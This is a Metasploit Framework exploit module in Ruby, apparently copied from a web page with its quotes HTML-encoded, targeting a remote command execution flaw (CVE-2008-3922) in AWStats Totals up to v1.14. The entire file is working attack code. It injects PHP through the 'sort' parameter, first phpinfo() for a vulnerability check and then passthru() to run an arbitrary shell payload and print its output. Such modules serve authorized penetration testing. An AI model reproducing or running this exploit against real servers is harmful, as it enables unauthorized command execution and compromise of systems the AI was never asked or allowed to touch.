# $Id: awstatstotals_multisort.rb 12715 2011-05-25 10:45:36Z patrickw $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;AWStats Totals =< v1.14 multisort Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an arbitrary command execution vulnerability in the
                    AWStats Totals PHP script. AWStats Totals version v1.0 - v1.14 are vulnerable.
            },
            &#039;Author&#039;         => [ &#039;patrick&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12715 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2008-3922&#039;],
                    [&#039;OSVDB&#039;, &#039;47807&#039;],
                    [&#039;BID&#039;, &#039;30856&#039;],
                    [&#039;URL&#039;, &#039;http://userwww.service.emory.edu/~ekenda2/EMORY-2008-01.txt&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 512,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl ruby bash telnet&#039;,
                        }
                },
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Aug 26 2008&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "The full URI path to awstatstotals.php", "/awstatstotals/awstatstotals.php"]),
                ], self.class)
    end
 
    def check
        res = send_request_cgi({
            &#039;uri&#039;      => datastore[&#039;URI&#039;],
            &#039;vars_get&#039; =>
            {
                &#039;sort&#039; => &#039;"].phpinfo().exit().$a["&#039;
            }
        }, 25)
 
        if (res and res.body.match(/localhost/))
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        command = Rex::Text.uri_encode(payload.encoded)
        sploit = datastore[&#039;URI&#039;] + &#039;?sort="].passthru(\&#039;echo%20YYY;&#039; + command + &#039;;echo%20YYY;\&#039;).exit().%24a["&#039;
 
        res = send_request_raw({
            &#039;uri&#039;     => sploit,
            &#039;method&#039;  => &#039;GET&#039;,
            &#039;headers&#039; =>
            {
                &#039;User-Agent&#039; => &#039;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#039;,
                &#039;Connection&#039; => &#039;Close&#039;,
            }
        }, 25)
 
        if (res)
            print_status("The server returned: #{res.code} #{res.message}")
 
            m = res.body.match(/YYY\n(.*)\nYYY/m)
 
            if (m)
                print_status("Command output from the server:")
                print("\n" + m[1] + "\n\n")
            else
                print_status("This server may not be vulnerable")
            end
        else
            print_status("No response from the server")
        end
    end
 
end



